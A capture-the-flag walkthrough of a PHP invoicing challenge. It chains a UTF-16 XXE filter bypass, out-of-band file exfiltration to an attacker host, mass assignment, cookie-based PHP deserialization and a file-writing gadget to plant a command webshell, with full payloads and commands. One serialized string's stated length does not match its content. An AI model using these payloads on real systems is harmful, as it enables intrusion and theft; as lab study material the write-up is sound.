---
layout: post
title: "Webverse Pro — Remit Walkthrough"
date: 2026-08-08
categories: [webverse, writeup, xxe, deserialization]
tags: [ctf, web, walkthrough, xxe, php, object-injection, mass-assignment, writeup]
---

# Webverse Pro — Remit Walkthrough

Hello guys and welcome back to another walkthrough. This time we'll be tackling Remit from Webverse Pro, a web challenge that turned out to be one of the cleanest exploit chains i've done in a while. The box is a custom PHP accounts-payable platform split into two virtual hosts, a supplier portal called remit.local where vendors upload xlsx invoices and an internal finance review console called review.remit.local. The challenge starts with a blind XXE in the invoice upload that has a weak regex filter which we bypass by encoding the XML as UTF-16LE. The blind XXE gives us out-of-band file read which we use to exfiltrate the whole application source with php://filter and zlib compression. The source reveals a mass assignment bug that lets a supplier promote their own account into a reviewer which opens the review console. The review console stores UI preferences in a cookie that is passed straight into unserialize giving us a PHP object injection. With a POP gadget in the archive class that writes files in its destructor we write a webshell into the web root and get command execution as www-data. From there the flag lives on the internal review container across the docker network and a quick ssh from the compromised container grabs it. Let's jump in.

I begun by running an nmap scan on the box using the command
```bash
nmap -sV -p- 10.100.97.14
```
The results are as follows
```
22/tcp open  ssh
80/tcp open  http
```

Only a single web service exposed which is always a good start. Browsing to it we get a supplier portal for an accounts-payable platform with open registration and an invoice upload flow. The /how-invoices-work page documented the upload format, an xlsx workbook containing a remit/ubl.xml file. That detail mattered because xlsx files are just zip archives. If the application trusted and parsed an XML part inside the archive, the attack surface wasn't the spreadsheet, it was the XML parser behind the upload feature.

The application felt like it was split by host header so i ran a vhost fuzz with ffuf. The command i used was
```bash
ffuf -u http://10.100.97.14/ -H "Host: FUZZ.remit.local" \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 0,138 -t 30
```
Output:
```
[Status: 200, Size: 1573, Words: 194, Lines: 37]
    * FUZZ: review
```

review.remit.local turned out to be the internal finance review console with a login page, the internal side of the platform. The reviewer console will matter a lot later in the chain. For now let's focus on the supplier upload.

A first test workbook containing a basic DOCTYPE declaration was rejected. The command i used was
```bash
curl -c cookies.txt -X POST http://remit.local/login \
  -d "email=test123@test.com&password=test123"

curl -b cookies.txt -X POST http://remit.local/invoices/upload \
  -F "invoice=@test_xxe.xlsx"
```
Output:
```
Rejected: remit/ubl.xml contains unsupported XML declarations.
```

The application is blocking DOCTYPE and ENTITY declarations with a regex. After we exfiltrate the source code later on the vulnerable upload logic gets confirmed in /var/www/html/inc/pages/upload.php
```php
if (preg_match('/<!DOCTYPE|<!ENTITY/i', $xml)) {
    $err = 'Rejected: remit/ubl.xml contains unsupported XML declarations.';
} else {
    $doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
}
```

The important part is the mismatch. The application tried to block XXE with a regex but the XML parser still enabled entity expansion and external DTD loading. So the entire defense depended on the regex seeing the dangerous declaration. The regex operates on the raw XML string before parsing, but XML parsers support multiple encodings. By encoding the XML as UTF-16LE with a BOM, the dangerous text still means the same thing to the XML parser but the byte layout changes. ASCII characters get separated by null bytes so the regex no longer matches. I generated the payload with a python script. The command i used was
```python
import codecs

xml = '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://10.8.0.252:7777/evil.dtd">
  %xxe;
]>
<Invoice xmlns="urn:oasis:names:specification:ubl:schema:xsd:Invoice-2">
  <ID>TEST-XXE</ID>
  <IssueDate>2026-07-01</IssueDate>
  <LegalMonetaryTotal>
    <PayableAmount currencyID="USD">1.00</PayableAmount>
  </LegalMonetaryTotal>
</Invoice>'''

with open("remit/ubl.xml", "wb") as f:
    f.write(codecs.BOM_UTF16_LE)
    f.write(xml.encode("utf-16-le"))
```

The parser sees valid XML and the regex sees bytes that do not match its pattern. That gives us blind out-of-band XXE. The external DTD hosted on the attack box uses parameter entities to read a file and send it back over HTTP
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.8.0.252:7777/?data=%file;'>">
%eval;
%exfil;
```

I hosted the evil.dtd and logged callbacks with a simple http server
```bash
python3 -m http.server 7777
```
Output:
```
10.100.97.14 - GET /evil.dtd HTTP/1.1 200
10.100.97.14 - GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA... HTTP/1.1 200
```

Decoding the callback data confirmed arbitrary file read. The command i used was
```bash
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA..." | base64 -d
```
Output:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

At this point the application is leaking local files through a blind XXE callback. Small files like /etc/passwd fit easily in the URL but larger PHP source files hit URL length limits because the file contents travel through the HTTP query string. The workaround is to compress before base64 encoding. The DTD below is the template i used
```xml
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/inc/pages/upload.php">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.8.0.252:7777/?data=%file;'>">
%eval;
%exfil;
```

So what does this actually do? The php://filter wrapper reads the file and runs it through two filters. zlib.deflate compresses it first to shrink it and convert.base64-encode makes it safe to travel in the URL. The result is sent to our callback server in the query string which is why it has to stay small. To read a leaked file back i decoded and decompressed it locally. The command i used was
```python
import base64
import zlib

encoded = "jVbbbts4EH33V8wKAWQDsYUt9qmRZbSJF33otoC9xaIIDIMSxxERStRSlC9/v0NS..."
raw = base64.b64decode(encoded)
source = zlib.decompress(raw, -15).decode("utf-8")
print(source)
```

The important thing to note is that one DTD leaks one file. The resource= path is the only thing that changes between runs. My first target was upload.php itself since that's the sink we are attacking and it confirmed the vulnerable code we saw earlier. After that i just edited the resource= path, regenerated the workbook and re-uploaded it for every file i wanted. One upload per file, one callback per file and the decode script above turns each callback into readable PHP source. This is what the full exfiltration gave me
```
/var/www/html/index.php
/var/www/html/inc/config.php
/var/www/html/inc/db.php
/var/www/html/inc/auth.php
/var/www/html/inc/pages/upload.php
/var/www/html/inc/pages/portal.php
/var/www/html/inc/pages/account.php
/var/www/html/inc/pages/queue.php
/opt/remit/lib/Report/Archive.php
```

The source code turned the attack from blind file read into a mapped path to RCE. The supplier account page contained a classic mass assignment bug. In /var/www/html/inc/pages/account.php
```php
$ALLOWED = ['full_name', 'company', 'role'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $sets = [];
    $binds = [];

    foreach ($ALLOWED as $field) {
        if (isset($_POST[$field])) {
            $sets[] = "$field = ?";
            $binds[] = $_POST[$field];
        }
    }

    if ($sets) {
        $binds[] = $user['id'];
        remit_pdo()->prepare(
            'UPDATE users SET ' . implode(', ', $sets) . ' WHERE id = ?'
        )->execute($binds);
    }
}
```

The problem is the allowed field list right there
```php
$ALLOWED = ['full_name', 'company', 'role'];
```

An authenticated supplier can update their own role. So i registered a fresh account and promoted it to a reviewer. The command i used was
```bash
curl -c cookies.txt -X POST http://remit.local/register \
  -d "email=flaghunter@test.com&password=hunt123&company=Hunt&full_name=FlagHunter"

curl -b cookies.txt -X POST http://remit.local/account \
  -d "full_name=FlagHunter&company=Hunt&role=remit_reviewer"
```

The promoted account then authenticated to the review console
```bash
curl -c review_cookies.txt -X POST http://review.remit.local/login \
  -d "email=flaghunter@test.com&password=hunt123"

curl -b review_cookies.txt http://review.remit.local/queue
```

Reviewer access was confirmed when the queue displayed the invoice review interface. And this is where the fun starts. The review queue uses a cookie named remit_view to store UI preferences. In /var/www/html/inc/pages/queue.php
```php
$view = [
    'sort'  => 'newest',
    'limit' => 50,
];

if (!empty($_COOKIE['remit_view'])) {
    $saved = @unserialize(base64_decode($_COOKIE['remit_view']));
    if (is_array($saved)) {
        $view = array_merge($view, $saved);
    }
}
```

The application base64-decodes a user controlled cookie and passes it directly into unserialize. The is_array check does not save us here because that check happens after deserialization. If a serialized object is provided PHP instantiates it first and any destructor on that object still runs when the request ends. Now we need a useful class. The autoloader in /var/www/html/inc/config.php loads classes under the Remit namespace from /opt/remit/lib
```php
spl_autoload_register(function ($class) {
    $prefix = 'Remit\\';

    if (strncmp($class, $prefix, strlen($prefix)) === 0) {
        $rel  = str_replace('\\', '/', substr($class, strlen($prefix)));
        $file = '/opt/remit/lib/' . $rel . '.php';

        if (is_file($file)) {
            require $file;
        }
    }
});
```

And the file /opt/remit/lib/Report/Archive.php contains the gadget
```php
namespace Remit\Report;

class Archive {
    public $path;
    public $body;

    public function __destruct() {
        if (!empty($this->path) && $this->body !== null) {
            @file_put_contents($this->path, $this->body);
        }
    }
}
```

That destructor writes attacker controlled content to an attacker controlled path. Combined with the object injection that is arbitrary file write. The serialized object needs two properties, path for where to write the file and body for what to write into it
```php
$archive = new Remit\Report\Archive();
$archive->path = '/var/www/html/s.php';
$archive->body = '<?php system($_GET["c"]); ?>';

echo base64_encode(serialize($archive));
```
The hand crafted serialized payload
```
O:20:"Remit\Report\Archive":2:{s:4:"path";s:19:"/var/www/html/s.php";s:4:"body";s:25:"<?php system($_GET["c"]);?>";}
```
And base64 encoded
```
TzoyMDoiUmVtaXRcUmVwb3J0XEFyY2hpdmUiOjI6e3M6NDoicGF0aCI7czoxOToiL3Zhci93d3cvaHRtbC9zLnBocCI7czo0OiJib2R5IjtzOjI1OiI8P3BocCBzeXN0ZW0oJF9HRVRbImMiXSk7Pz4iO30=
```

The trigger sets the cookie and hits the queue endpoint
```bash
COOKIE='TzoyMDoiUmVtaXRcUmVwb3J0XEFyY2hpdmUiOjI6e3M6NDoicGF0aCI7czoxOToiL3Zhci93d3cvaHRtbC9zLnBocCI7czo0OiJib2R5IjtzOjI1OiI8P3BocCBzeXN0ZW0oJF9HRVRbImMiXSk7Pz4iO30='

curl -s -b "PHPSESSID=$(cat /tmp/phpsessid); remit_view=$COOKIE" \
  http://review.remit.local/queue -o /dev/null
```

What happens internally. queue.php base64-decodes the remit_view cookie, unserialize instantiates Remit\Report\Archive, the autoloader loads Archive.php, the result fails the is_array check but the object already exists, at request shutdown __destruct runs and writes /var/www/html/s.php. The review console cookie became a file write primitive.

The webshell confirmed command execution as www-data. The command i used was
```bash
curl -s 'http://remit.local/s.php?c=id'
```
Output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The flag was stored on the internal review console container at 10.100.97.3. From the compromised web container the final command reached across the docker network
```bash
curl -s 'http://remit.local/s.php?c=ssh%20clerk@10.100.97.3%20cat%20/flag.txt'
```
Output:
```
WEBVERSE{00xml_……………….._1nj3ct}
```

And the box is pretty much done. No single bug carried the whole exploit by itself. The compromise worked because each vulnerability exposed exactly what the next step needed. The XXE gave file read. File read gave source. Source revealed mass assignment. Mass assignment opened the review console. The review console exposed deserialization. Deserialization reached a file write gadget. File write became RCE because the target path was inside the web root. Small, locally scoped mistakes become critical when they line up across trust boundaries.

If you liked the walkthrough give it a clap below and follow me so that you don't miss any upcoming ones.
